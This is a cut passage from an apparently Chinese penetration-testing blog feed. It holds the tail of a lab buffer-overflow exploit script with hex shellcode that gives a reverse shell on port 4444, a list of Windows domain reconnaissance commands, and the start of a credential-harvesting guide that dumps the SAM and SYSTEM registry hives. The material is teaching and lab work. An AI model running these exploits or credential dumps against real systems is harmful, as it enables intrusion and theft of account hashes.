data-num="28"></td><td><pre>buf <span class="token operator">+=</span> b<span class="token string double-quoted-string">"\xbe\x62\x6f\x9b\xc5\x2e\xb0\x2a\xc7\xa7\x43\x09\xce"</span></pre></td></tr><tr><td data-num="29"></td><td><pre>buf <span class="token operator">+=</span> b<span class="token string double-quoted-string">"\xc1\x33\xf8\x6f\x4a\xea\x82\xe1\x36\x93\x91\xc7\xce"</span></pre></td></tr><tr><td data-num="30"></td><td><pre>buf <span class="token operator">+=</span> b<span class="token string double-quoted-string">"\x53\xdf\xf9\xc1\x33\x15\xcc\x53\x82\x7d\x26\xdd\xb1"</span></pre></td></tr><tr><td data-num="31"></td><td><pre>buf <span class="token operator">+=</span> b<span class="token string double-quoted-string">"\x2a\xf8\x0f\x10\x17\xbd\x67\xb0\x9f\x52\x58\x21\x39"</span></pre></td></tr><tr><td data-num="32"></td><td><pre>buf <span class="token operator">+=</span> b<span class="token string double-quoted-string">"\x8b\x02\xe7\x7c\x22\x7a\xc2\x6d\x69\x3e\xa2\x29\xff"</span></pre></td></tr><tr><td data-num="33"></td><td><pre>buf <span class="token operator">+=</span> b<span class="token string double-quoted-string">"\x68\xb0\x2b\xe9\x68\xa8\x2b\xf9\x6d\xb0\x15\xd6\xf2"</span></pre></td></tr><tr><td data-num="34"></td><td><pre>buf <span class="token operator">+=</span> b<span class="token string double-quoted-string">"\xd9\xfb\x50\xeb\x6f\x9d\xe1\x68\xa0\x82\x9f\x56\xee"</span></pre></td></tr><tr><td data-num="35"></td><td><pre>buf <span class="token operator">+=</span> b<span class="token string double-quoted-string">"\xfa\xb2\x5e\x19\xa8\x14\xce\x53\xdf\xf9\x56\x40\xe8"</span></pre></td></tr><tr><td data-num="36"></td><td><pre>buf <span class="token operator">+=</span> b<span class="token string double-quoted-string">"\x12\xa3\x19\xa8\x93\x38\x9a\x77\x2f\xc5\x06\x08\xaa"</span></pre></td></tr><tr><td data-num="37"></td><td><pre>buf <span class="token operator">+=</span> b<span class="token string double-quoted-string">"\x85\xa1\x6e\xdd\x51\x8c\x7d\xfc\xc1\x33"</span></pre></td></tr><tr><td data-num="38"></td><td><pre>    </pre></td></tr><tr><td data-num="39"></td><td><pre>payload <span class="token operator">=</span> b<span class="token string single-quoted-string">''</span></pre></td></tr><tr><td data-num="40"></td><td><pre>payload <span class="token operator">+=</span> junk</pre></td></tr><tr><td data-num="41"></td><td><pre>payload <span class="token operator">+=</span> ret_addr</pre></td></tr><tr><td data-num="42"></td><td><pre><span class="token comment">#payload += nops</span></pre></td></tr><tr><td data-num="43"></td><td><pre>payload <span class="token operator">+=</span> buf</pre></td></tr><tr><td data-num="44"></td><td><pre>with socket<span class="token operator">.</span><span class="token function">socket</span><span class="token punctuation">(</span>socket<span class="token operator">.</span><span class="token constant">AF_INET</span><span class="token punctuation">,</span>socket<span class="token operator">.</span><span class="token constant">SOCK_STREAM</span><span class="token punctuation">)</span> <span class="token keyword">as</span> clientSock<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="45"></td><td><pre>    clientSock<span class="token operator">.</span><span class="token function">connect</span><span class="token punctuation">(</span><span class="token punctuation">(</span>target_ip<span class="token punctuation">,</span>target_port<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="46"></td><td><pre>    data_from_srv <span class="token operator">=</span> clientSock<span class="token operator">.</span><span class="token function">recv</span><span class="token punctuation">(</span>recv_buf<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="47"></td><td><pre>    <span class="token keyword">print</span><span class="token punctuation">(</span>f<span class="token string double-quoted-string">"Reply --> &#123;data_from_srv&#125;"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="48"></td><td><pre>    <span class="token keyword">print</span><span class="token punctuation">(</span>f<span class="token string double-quoted-string">"Sending --> &#123;payload&#125;"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="49"></td><td><pre>    clientSock<span class="token operator">.</span><span class="token function">sendall</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span></pre></td></tr></table></figure><p>本地开启监听 4444 端口，运行脚本，拿到最终 flag</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/2467930-20211011231104426-75811449.png" alt="" /></p>
<p><span class="exturl" data-url="aHR0cDovL3Z4ZXIuY24vP2lkPTU=">大佬链接</span></p>
]]></content>
      <categories>
        <category>vulnhub靶机实战</category>
      </categories>
      <tags>
        <tag>vulnhub靶机实战</tag>
      </tags>
  </entry>
  <entry>
    <title>windows信息搜集篇（一）之（域工作组） 信息收集及工具使用</title>
    <url>/article/c99fbb57.html</url>
    <content><![CDATA[<p>唔，终于熬到信息搜集了 QAQ，可以说是内网渗透的非常重要的一部分吧，下面和小编一起简单了解一下吧。好东西当然要一起分享啦，所以......</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211217104741759.png" alt="image-20211217104741759" /></p>
<h3 id="00x01windows域工作组-信息收集"><a class="anchor" href="#00x01windows域工作组-信息收集">#</a> 00x01.Windows（域工作组） 信息收集</h3>
<p>主机信息搜集一般包含以下内容：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>操作系统、权限、内网<span class="token constant">IP</span>地址段、杀软、端口、服务、补丁情况、网络环境情况、共享、会话等如果是域内主机，那么操作系统、应用软件、补丁、服务、杀软等。</pre></td></tr></table></figure><h4 id="一-windows工作组"><a class="anchor" href="#一-windows工作组">#</a> 一、Windows（工作组）</h4>
<h5 id="1-查看当前用户whoami-user"><a class="anchor" href="#1-查看当前用户whoami-user">#</a> 1、查看当前用户（whoami /user）</h5>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211127133153098.png" alt="image-20211127133153098" /></p>
<h5 id="2-查看当前用户权限whoami-priv"><a class="anchor" href="#2-查看当前用户权限whoami-priv">#</a> 2、查看当前用户权限 (whoami /priv)</h5>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211127133300792.png" alt="image-20211127133300792" /></p>
<h5 id="3-查看系统信息systeminfo"><a class="anchor" href="#3-查看系统信息systeminfo">#</a> 3、查看系统信息（systeminfo）</h5>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211127133406078.png" alt="image-20211127133406078" /></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211127133431102.png" alt="image-20211127133431102" /></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211127133530540.png" alt="image-20211127133530540" /></p>
<h5 id="4-查看网络连接状态netstat-ano"><a class="anchor" href="#4-查看网络连接状态netstat-ano">#</a> 4、查看网络连接状态（netstat -ano）</h5>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211127133615592.png" alt="image-20211127133615592" /></p>
<h5 id="5-机器名hostname"><a class="anchor" href="#5-机器名hostname">#</a> 5、机器名（hostname）</h5>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211127133651973.png" alt="image-20211127133651973" /></p>
<h5 id="6-当前操作系统"><a class="anchor" href="#6-当前操作系统">#</a> 6、当前操作系统</h5>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>wmic <span class="token constant">OS</span> <span class="token keyword">get</span> Caption<span class="token punctuation">,</span>CSDVersion<span class="token punctuation">,</span>OSArchitecture<span class="token punctuation">,</span>Version</pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211127133726858.png" alt="image-20211127133726858" /></p>
<h5 id="7-查杀软"><a class="anchor" href="#7-查杀软">#</a> 7、查杀软</h5>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token constant">WMIC</span> <span class="token operator">/</span>Node<span class="token operator">:</span>localhost <span class="token operator">/</span>Namespace<span class="token operator">:</span>\\root\SecurityCenter2 Path AntiVirusProduct Get displayName <span class="token operator">/</span>Format<span class="token operator">:</span>list</pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211127134020531.png" alt="image-20211127134020531" /></p>
<p>这里由于小编把防护给关了，所以没有显示，下面附上大佬的显示图</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211127134502222.png" alt="image-20211127134502222" /></p>
<h5 id="8-查看当前安装的程序"><a class="anchor" href="#8-查看当前安装的程序">#</a> 8、查看当前安装的程序</h5>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>wmic product <span class="token keyword">get</span> name<span class="token punctuation">,</span>version</pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211127134733601.png" alt="image-20211127134733601" /></p>
<h5 id="9-查看网络配置ipconfig-all"><a class="anchor" href="#9-查看网络配置ipconfig-all">#</a> 9、查看网络配置（ipconfig /all）</h5>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211127134809036.png" alt="image-20211127134809036" /></p>
<h5 id="10-查看进程tasklist-v"><a class="anchor" href="#10-查看进程tasklist-v">#</a> 10、查看进程（tasklist /v）</h5>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>有些进程可能是域用户开启的<span class="token operator">-</span><span class="token operator">></span>通过管理员权限 凭证窃取<span class="token operator">-</span><span class="token operator">></span>窃取域用户的凭证</pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211127134845636.png" alt="image-20211127134845636" /></p>
<h5 id="11-查看当前登录域"><a class="anchor" href="#11-查看当前登录域">#</a> 11、查看当前登录域</h5>
<pre><code class="language-ABAP">net config workstation
</code></pre>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211127134947750.png" alt="image-20211127134947750" /></p>
<h5 id="12-远程桌面连接历史记录"><a class="anchor" href="#12-远程桌面连接历史记录">#</a> 12、远程桌面连接历史记录</h5>
<pre><code class="language-ABAP">cmdkey /l
获取到凭证之后，本地解密
</code></pre>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211127135026485.png" alt="image-20211127135026485" /></p>
<h5 id="13-查看本机上的用户账号列表"><a class="anchor" href="#13-查看本机上的用户账号列表">#</a> 13、查看本机上的用户账号列表</h5>
<pre><code class="language-ABAP">net user
</code></pre>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211127135102033.png" alt="image-20211127135102033" /></p>
<h5 id="14-查看某个本机用户的具体信息"><a class="anchor" href="#14-查看某个本机用户的具体信息">#</a> 14、查看某个本机用户的具体信息</h5>
<pre><code class="language-ABAP">net user 用户名
</code></pre>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211127135145516.png" alt="image-20211127135145516" /></p>
<h5 id="15-获取域用户信息"><a class="anchor" href="#15-获取域用户信息">#</a> 15、获取域用户信息</h5>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>net user <span class="token operator">/</span>domain #显示所在域的用户名单</pre></td></tr><tr><td data-num="2"></td><td><pre>net user 域用户<span class="token operator">/</span>domain #获取某个域用户的详细信息</pre></td></tr><tr><td data-num="3"></td><td><pre>net user <span class="token operator">/</span>domain xxx <span class="token number">1231312</span> #修改域用户的密码，需要域管理员权限</pre></td></tr></table></figure><h5 id="16-获取域用户列表"><a class="anchor" href="#16-获取域用户列表">#</a> 16、获取域用户列表</h5>
<p>在域服务器上输入以下命令</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>daquery user</pre></td></tr></table></figure><h2 id="00x02常见windows-信息收集工具"><a class="anchor" href="#00x02常见windows-信息收集工具">#</a> 00x02. 常见 windows 信息收集工具</h2>
<h4 id="一-对象"><a class="anchor" href="#一-对象">#</a> 一、对象</h4>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>网站 ：源码  robots文件   后台登录</pre></td></tr><tr><td data-num="2"></td><td><pre>服务器 ：<span class="token constant">IP</span>地址  服务器操作系统类型和版本   端口开放情况</pre></td></tr><tr><td data-num="3"></td><td><pre>管理员 ：个人信息  手机号  社交账号  常用密码  敏感数字</pre></td></tr></table></figure><h4 id="二-网站操作类型识别方式"><a class="anchor" href="#二-网站操作类型识别方式">#</a> 二、网站操作类型识别方式</h4>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>windows ：不区分大小写</pre></td></tr><tr><td data-num="2"></td><td><pre>Linux ：区分大小写</pre></td></tr></table></figure><h4 id="三-网站指纹识别工具"><a class="anchor" href="#三-网站指纹识别工具">#</a> 三、网站指纹识别工具</h4>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>御剑指纹识别</pre></td></tr><tr><td data-num="2"></td><td><pre>云悉在线指纹识别</pre></td></tr><tr><td data-num="3"></td><td><pre>kali——whatweb</pre></td></tr><tr><td data-num="4"></td><td><pre>火狐浏览器插件——Wappalyzer</pre></td></tr></table></figure><h4 id="四-目录扫描敏感文件扫描"><a class="anchor" href="#四-目录扫描敏感文件扫描">#</a> 四、目录扫描 / 敏感文件扫描</h4>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>搜索网站目录下面的敏感文件 间接识别网站使用的框架或者内容管理系统</pre></td></tr><tr><td data-num="2"></td><td><pre>工具  ：御剑指纹识别</pre></td></tr><tr><td data-num="3"></td><td><pre>	   谷歌黑客语法</pre></td></tr><tr><td data-num="4"></td><td><pre>		site：限制搜索范围的域名</pre></td></tr><tr><td data-num="5"></td><td><pre>		inurl：限制搜索的url中必须存在的内容</pre></td></tr><tr><td data-num="6"></td><td><pre>		intext：限制搜索的页面中必须存在的内容</pre></td></tr><tr><td data-num="7"></td><td><pre>		intitle：限制搜索的页面的标题栏中的内容</pre></td></tr><tr><td data-num="8"></td><td><pre>		filetype：限制搜索的文件类型</pre></td></tr></table></figure><h4 id="五-ip查询"><a class="anchor" href="#五-ip查询">#</a> 五、IP 查询</h4>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>命令：ping nslookup</pre></td></tr><tr><td data-num="2"></td><td><pre>工具：站长之家 ip138</pre></td></tr></table></figure><h4 id="六-端口扫描"><a class="anchor" href="#六-端口扫描">#</a> 六、端口扫描</h4>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>nmap</pre></td></tr><tr><td data-num="2"></td><td><pre>御剑端口扫描</pre></td></tr><tr><td data-num="3"></td><td><pre>shell、python脚本</pre></td></tr></table></figure><h4 id="七-whois查询"><a class="anchor" href="#七-whois查询">#</a> 七、whois 查询</h4>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>站长工具</pre></td></tr><tr><td data-num="2"></td><td><pre>ip138</pre></td></tr><tr><td data-num="3"></td><td><pre>中国万网</pre></td></tr><tr><td data-num="4"></td><td><pre>爱站网</pre></td></tr></table></figure><h4 id="八-子域名查询"><a class="anchor" href="#八-子域名查询">#</a> 八、子域名查询</h4>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token function">查询方式：枚举</span><span class="token punctuation">(</span>暴力破解<span class="token punctuation">)</span> </pre></td></tr><tr><td data-num="2"></td><td><pre>工具：子域名挖掘机</pre></td></tr></table></figure><h4 id="九-空间搜索引擎"><a class="anchor" href="#九-空间搜索引擎">#</a> 九、空间搜索引擎</h4>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>shadon</pre></td></tr><tr><td data-num="2"></td><td><pre>钟馗之眼</pre></td></tr><tr><td data-num="3"></td><td><pre>fofa</pre></td></tr></table></figure><h4 id="十-常见端口"><a class="anchor" href="#十-常见端口">#</a> 十、常见端口</h4>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token number">21</span>：文件传输  <span class="token constant">FTP</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token number">22</span>：<span class="token constant">SSH</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token number">23</span>：Telnet</pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token number">25</span>：电子邮件</pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token number">53</span>：<span class="token constant">DNS</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token number">67</span>：<span class="token constant">DHCP</span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token number">110</span>：<span class="token constant">POP3</span></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token number">135</span>：<span class="token constant">RPC</span></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token number">139</span>：NetBIOS</pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token number">443</span>：<span class="token constant">HTTPS</span></pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token number">445</span>：<span class="token constant">SMB</span>协议</pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token number">3306</span>：MySQL</pre></td></tr><tr><td data-num="13"></td><td><pre><span class="token number">3389</span>：远程桌面</pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token number">1521</span>：Orale</pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token number">1433</span>：sql server</pre></td></tr></table></figure><h2 id="00x03什么是信息搜集"><a class="anchor" href="#00x03什么是信息搜集">#</a> 00x03 什么是信息搜集</h2>
<p>信息搜集简单来说就是利用一些手段或者工具，搜集目标的信息。比如 IP 信息，端口信息，DNS 信息甚至是目标的组织架构，有些目标虽然看似不起眼，但是对渗透是否成功起到关键作用。</p>
<p><strong>渗透测试上信息搜集分为两类：主动信息搜集和被动信息搜集。</strong></p>
<h4 id="被动信息搜集"><a class="anchor" href="#被动信息搜集">#</a> <strong>被动信息搜集</strong></h4>
<p>被动信息收集：不与目标直接交互，通过公开渠道可获得的可用的信息。</p>
<p>信息收集内容:</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token constant">IP</span>地址段 、域名信息 、邮件地址 、文档图片数据 、公司地址 、公司组织架构 、联系电话 <span class="token operator">/</span> 传真号码 、人员姓名 <span class="token operator">/</span> 职务 、目标系统使用的技术架构 、公开的商业信息</pre></td></tr></table></figure><h5 id="常用工具"><a class="anchor" href="#常用工具">#</a> <strong>常用工具</strong></h5>
<h6 id="nslookup"><a class="anchor" href="#nslookup">#</a> <strong>NSLOOKUP</strong></h6>
<p><code>nslookup</code>  命令几乎在所有的 PC 操作系统上都有安装，用于 ** 查询 DNS 的记录，查看域名解析是否正常，在网络故障的时候用来诊断网络问题。** 信息安全人员，可以通过返回的信息进行信息搜集。</p>
<h6 id="dig"><a class="anchor" href="#dig">#</a> <strong>DIG</strong></h6>
<p><code>Dig</code>  也是对 <code>DNS</code>  信息进行搜集的工具， <code>dig</code>  相比 <code>nsllooup</code>  不光功能更丰富，首先通过默认的上连 <code>DNS</code>  服务器去查询对应的 <code>IP</code>  地址，然后再以设置的 <code>dnsserver</code>  为上连 <code>DNS</code>  服务器。</p>
<h6 id="whois"><a class="anchor" href="#whois">#</a> <strong>Whois</strong></h6>
<p><code>whois</code>  就是一个用来查询域名是否已经被注册，以及注册域名的详细信息的数据库（如域名所有人、域名注册商）。通过 <code>whois</code>  来实现对域名信息的查询。早期的 <code>whois</code>  查询多以命令列接口存在，但是现在出现了一些网页接口简化的线上查询工具，可以一次向不同的数据库查询。网页接口的查询工具仍然依赖 <code>whois</code>  协议向服务器发送查询请求，命令列接口的工具仍然被系统管理员广泛使用。 <code>whois</code>  通常使用 <code>TCP</code>  协议 <code>43</code>  端口。每个域名 <code>/IP</code>  的 <code>whois</code>  信息由对应的管理机构保存。</p>
<h6 id="google-hacking"><a class="anchor" href="#google-hacking">#</a> <strong>google hacking</strong></h6>
<p><code>Google Hacking</code>  是利用谷歌搜索的强大，来在浩瀚的互联网中搜索到我们需要的信息。轻量级的搜索可以搜素出一些遗留后门，不想被发现的后台入口，中量级的搜索出一些用户信息泄露，源代码泄露，未授权访问等等，重量级的则可能是 <code>mdb</code>  文件下载， <code>CMS</code>  未被锁定 <code>install</code>  页面，网站配置密码， <code>php</code>  远程文件包含漏洞等重要信息</p>
<p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTkyL2FydGljbGUvZGV0YWlscy84NDAyOTgwOQ==">参考链接</span></p>
<h6 id="shodan"><a class="anchor" href="#shodan">#</a> <strong>SHODAN</strong></h6>
<p><code>Shodan</code>  是一款网络空间搜索引擎，和我们常见的百度谷歌不同，他主要搜索的是存在于互联网中的设备，服务器、摄像头、工控设备、智能家居等，都是他的目标。 <code>Shodan</code>  不仅可以发现这些设备，并且可以识别出其版本，位置，端口，服务等一些信息，并且进行了一些相应分类。</p>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vZ3JlZW5jb2xsYXIvcC8xMzgxMDI1MC5odG1s">参考链接</span></p>
<h6 id="recon-ng"><a class="anchor" href="#recon-ng">#</a> <strong>RECON-NG</strong></h6>
<p><code>Recon-ng</code>  是一个信息搜集的框架，它之于信息搜集完全可以和 <code>exploit</code>  之于 <code>metasploit framework</code> 、社会工程学之于 <code>SET</code> 。</p>
<h4 id="主动信息搜集"><a class="anchor" href="#主动信息搜集">#</a> <strong>主动信息搜集</strong></h4>
<p>主动信息搜集是利用一些工具和手段，与搜集的目标发生一些交互，从而获得目标信息的一种行为。</p>
<p>主动信息搜集的过程中无法避免会留下一些痕迹。</p>
<h5 id="常用方法"><a class="anchor" href="#常用方法">#</a> <strong>常用方法</strong></h5>
<h6 id="抓包"><a class="anchor" href="#抓包">#</a> <strong>抓包</strong></h6>
<p>用 <code>bp</code>  等工具进行抓包，获取相关信息。</p>
<h6 id="netdiscover"><a class="anchor" href="#netdiscover">#</a> <strong>Netdiscover</strong></h6>
<p><code>NetDiscover</code>  通过  <code>ARP</code>  主动和被动分析识别网络主机， 它主要是在无线接口上使用。 <code>NetDiscover</code>  在不使用  <code>DHCP</code>  的无线网络上非常有用。使用  <code>Netdiscover</code>  工具可以在网络上扫描  <code>IP</code>  地址，检查在线主机或搜索为它们发送的  <code>ARP</code>  请求。</p>
<h6 id="nmap"><a class="anchor" href="#nmap">#</a> <strong>NMAP</strong></h6>
<p>*\Nmap\（* 网络映射器）是 <code>Gordon Lyon</code>  最初编写的一种安全扫描器，用于发现计算机网络上的主机和服务，从而创建网络的 “映射”。为了实现其目标， <code>Nmap</code>  将特定数据包发送到目标主机，然后分析响应 <code>.NMAP</code>  强大的网络工具，用于枚举和测试网络。</p>
<p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20xNTg1NzYxMjk3L2FydGljbGUvZGV0YWlscy84MDAxNTcyNg==">参考链接</span></p>
<h6 id="scapy"><a class="anchor" href="#scapy">#</a> <strong>Scapy</strong></h6>
<p><code>Scapy</code>  是一种用于计算机网络的数据包处理工具，由 <code>Philippe Biondi</code>  用 <code>Python</code>  编写。它可以伪造或解码数据包，通过网络发送它们，捕获它们，并匹配请求和响应。它还可以用于处理扫描、跟踪路由、探测、单元测试、攻击和网络发现等任务。</p>
<p><strong>Scapy 和 Scrapy 完全不同，它俩虽然都和 Python 有关，Scapy 是网络或者是黑客工具，Scrapy 是爬虫框架。</strong></p>
<h6 id="hping"><a class="anchor" href="#hping">#</a> <strong>Hping</strong></h6>
<p><code>Hping</code>  是一个命令行下使用的 <code>TCP/IP</code>  数据包组装 / 分析工具，其命令模式很像 <code>Unix</code>  下的 <code>ping</code>  命令，但是它不是只能发送 <code>ICMP</code>  回应请求，它还可以支持 <code>TCP、UDP、ICMP</code>  和 <code>RAW-IP</code>  协议，它有一个路由跟踪模式，能够在两个相互包含的通道之间传送文件。Hping 常被用于检测网络和主机，其功能非常强大，可在多种操作系统下运行，如 <code>Linux，FreeBSD，NetBSD，OpenBSD，Solaris，MacOs X，Windows</code> 。</p>
<h6 id="dmitry"><a class="anchor" href="#dmitry">#</a> <strong>dmitry</strong></h6>
<p><code>DMitry(Deepmagic Information Gathering Tools</code>  深度信息收集工具) 是一个 <code>linux</code>  下用 <code>C</code>  语言写的工具。它能够尽可能的获取指定主机目标的信息。基础功能是获取目标的子域名， <code>Email</code>  地址，运行时间相关信息， <code>tcp</code>  端口， <code>whois</code>  信息等等。</p>
<h2 id="感言"><a class="anchor" href="#感言">#</a> 感言：</h2>
<p>感言？什么感言？？还不赶紧不信息搜集？？？</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/093F2E5DEC34474D2929F2A4097949BA.gif" alt="img" /></p>
<h2 id="参考链接"><a class="anchor" href="#参考链接">#</a> 参考链接：</h2>
<p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3N5Y2Ftb3JlbGcvYXJ0aWNsZS9kZXRhaWxzLzExODcyNzkwMQ==">内网渗透 ----1、信息收集：Windows 工作组和域</span></p>
<p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2QxOTk2YS9hcnRpY2xlL2RldGFpbHMvMTA4NjQwNjc3">信息收集常用的工具</span></p>
<p><span class="exturl" data-url="aHR0cHM6Ly9iYWlqaWFoYW8uYmFpZHUuY29tL3M/aWQ9MTY2ODc4OTM3Mjc0NDk4OTg3MCZhbXA7d2ZyPXNwaWRlciZhbXA7Zm9yPXBj">盘点信息收集！信息收集的工具你听过几种</span></p>
]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>内网渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>windows信息搜集篇（三）之凭证收集</title>
    <url>/article/49a1e863.html</url>
    <content><![CDATA[<p>唔，已经到凭证收集了啊！</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/2467930-20211206153219182-303389120.gif" alt="image" /></p>
<p>收集本机凭据是非常重要的环节。通常我们可以收集的凭据包括但不限于: <code>Windows hash [NTLM,LM]</code> , 浏览器密码、 <code>cookie</code>  远程桌面密码  <code>VPN</code>  密码  <code>WLAN</code>  密码  <code>IIS</code>  服务器密码  <code>FTP</code>  密码等等.</p>
<h2 id="windows密码"><a class="anchor" href="#windows密码">#</a> WINDOWS 密码</h2>
<p><code>Windows</code>  密码加密后一般两种形式</p>
<p><code>NTLM</code>  哈希和 <code>LM</code>  哈希 [VISTA 和 2008 已经取消] 这些哈希有两个存储位置，本地用户在 <code>SAM</code>  数据库，</p>
<p>域用户存储在域控制器的 <code>NTDS.dit</code>  数据库中。当用户登陆时，这些哈希也可能存储在内存中，能够被我们抓取到</p>
<h2 id="sam-是什么"><a class="anchor" href="#sam-是什么">#</a> SAM 是什么？</h2>
<p>安全账号管理器 - 也就是存储用户密码的数据库文件，</p>
<p>他在 <code>windows/system32/config/SAM</code>  中，挂载在 <code>HKLM/SAM</code>  上.</p>
<p>为了防破解， <code>windows</code>  核心版本 <code>NT4.0</code>  中引入了 <code>SYSTEM</code>  函数， <code>SAM</code>  的磁盘上副本文件将被部分加密，以便存储在 <code>SAM</code>  中所有的本地账户 <code>immature</code>  哈希都使用密钥 (成 <code>SYSKEY</code>  加密)。</p>
<h3 id="提取sam-数据库哈希方法导出sam数据库中的密码"><a class="anchor" href="#提取sam-数据库哈希方法导出sam数据库中的密码">#</a> 提取 <code>SAM</code>  数据库哈希方法，导出 <code>sam</code>  数据库中的密码</h3>
<p><strong>方法 1</strong>：以<strong>管理员权限</strong>运行 <code>cmd</code> , 输入以下命令</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>reg save hklm\sam c<span class="token operator">:</span>\sam<span class="token punctuation">.</span>hive</pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre>reg save hklm\system c<span class="token operator">:</span>\system<span class="token punctuation">.</span>hive</pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211205183444485.png" alt="image-20211205183444485" /></p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/image-20211205183457807.png" alt="image-20211205183457807" /></p>
<p><strong>方法 2</strong>：使用 <code>powershell</code></p>
<p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tLzIxcjAwMC9Qb3dlcnNoZWxsZXJ5">Powershellery 脚本下载地址</span></p>
